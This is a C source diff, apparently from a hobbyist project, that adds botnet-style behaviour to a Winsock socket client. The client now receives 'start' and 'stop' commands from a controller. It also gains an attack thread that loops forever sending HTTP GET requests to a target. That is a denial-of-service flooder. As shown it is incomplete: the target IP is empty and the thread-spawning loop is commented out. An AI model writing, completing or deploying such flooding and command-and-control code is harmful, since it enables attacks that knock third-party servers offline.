@@ -8,13 +8,26 @@
 
 void startWinsock(WSADATA *wsaData);
 SOCKET startSocket();
-void connectToServer(struct sockaddr_in *serv_addr, SOCKET client_socket,  const char* server_ip);
+void connectSocket(struct sockaddr_in *serv_addr, SOCKET client_socket,  const char* server_ip);
 void sendMsg(SOCKET client_socket, const char *msg);
 void closeSocket(SOCKET client_socket);
+DWORD WINAPI attack(LPVOID target_ip);
+void receiveCommand(SOCKET client_socket, char *cmd);
+
+struct address{
+    const char* ip;
+    int port;
+};
+
+volatile int running = 0;
 
 int main() {
 
-    SOCKET client_socket;
+    char cmd_buff[1024];
+    char output_buff[1024]; 
+
+    // server socket details and setup
+    SOCKET server_socket;
     struct sockaddr_in serv_addr;
     WSADATA wsaData;
     serv_addr.sin_family = AF_INET;
@@ -22,9 +35,59 @@ int main() {
     const char* server_ip = "127.0.0.1";
 
     startWinsock(&wsaData);
-    client_socket = startSocket();
-    connectToServer(&serv_addr, client_socket, server_ip);
+    server_socket = startSocket();
+    connectSocket(&serv_addr, server_socket, server_ip);
+
+    while (1) {
+        memset(cmd_buff, 0, 1024);
+        memset(output_buff, 0, 1024);
+        receiveCommand(server_socket, cmd_buff);
+
+        if (strcmp(cmd_buff, "start") == 0){
+            struct address target_addr;
+            target_addr.ip = "";
+            target_addr.port = 80;
+            printf("Executing attack...\n");
+            // for (int i=0; i<50; i++){
+            //     HANDLE attack_thread = CreateThread(NULL, 0, attack, (LPVOID)&target_addr, 0, NULL);
+            //     // printf("Thread created");
+            //     if (attack_thread == NULL){
+            //         printf("error creating thread \n");
+            //     }
+            // }
+            // while (1){
+            //     ;
+            // }
+        } else if (strcmp(cmd_buff, "stop") == 0){
+            break;
+        }
+    }
+
     return 0;
+}
+
+DWORD WINAPI attack(LPVOID addr){
+    struct address target = *(struct address*)addr;
+    const char* target_ip = target.ip;
+    int port = target.port;
+    SOCKET target_socket;
+    struct sockaddr_in target_addr;
+    WSADATA wsaData;
+    target_addr.sin_family = AF_INET;
+    target_addr.sin_port = htons(port);
+    startWinsock(&wsaData);
+    target_socket = startSocket();
+    connectSocket(&target_addr, target_socket, target_ip);
+    char msg[64];
+    int sprintf_stat = snprintf(msg, sizeof(msg), "GET / HTTP/1.1\r\nHost: %s\r\n\r\n", target_ip);
+    // printf("%i", sprintf_stat);
+    while(1){
+        if (running){
+            sendMsg(target_socket, msg);
+        } else {
+            ;
+        }
+    }
 }
 
 // function to initialize Winsock so that we can use sockets
@@ -49,27 +112,27 @@ SOCKET startSocket() {
 }
 
 // function to connect this client to the server via socket
-void connectToServer(struct sockaddr_in *serv_addr, SOCKET client_socket, const char* server_ip) {
+void connectSocket(struct sockaddr_in *addr, SOCKET socket, const char* ip) {
 
-    if (inet_pton(AF_INET, server_ip, &serv_addr->sin_addr) <= 0) {
+    if (inet_pton(AF_INET, ip, &addr->sin_addr) <= 0) {
         printf("\nInvalid address/ Address not supported \n");
-        closesocket(client_socket);
+        closesocket(socket);
         WSACleanup();
         exit(EXIT_FAILURE);
-    } else if (connect(client_socket, (struct sockaddr *)serv_addr, sizeof(*serv_addr)) < 0) {
+    } else if (connect(socket, (struct sockaddr *)addr, sizeof(*addr)) < 0) {
         printf("\nConnection Failed. \n");
-        printf("%i", client_socket);
-        closesocket(client_socket);
+        printf("%i", socket);
+        closesocket(socket);
         WSACleanup();
         exit(EXIT_FAILURE);
     } else{
-        printf("Client connected to server.\n");
+        printf("Connection successful.\n");
     }
 }
 
 // function to send message via socket connection
-void sendMsg(SOCKET client_socket, const char *msg) {
-    int sent = send(client_socket, msg, strlen(msg), 0);
+void sendMsg(SOCKET socket, const char *msg) {
+    int sent = send(socket, msg, strlen(msg), 0);
     if (sent == -1){
         printf("Error sending message. The connection must have been cut.\n");
     } else{
@@ -78,7 +141,14 @@ void sendMsg(SOCKET client_socket, const char *msg) {
 }
 
 // function to close the socket and clean up the resources that are no longer being used
-void closeSocket(SOCKET client_socket) {
-    closesocket(client_socket);
+void closeSocket(SOCKET socket) {
+    closesocket(socket);
     WSACleanup();
+}
+
+void receiveCommand(SOCKET client_socket, char *cmd){
+    int received = recv(client_socket, cmd, 1024, 0);
+    if (received < 1){
+        printf("Error receiving message.\n");
+    }
 }
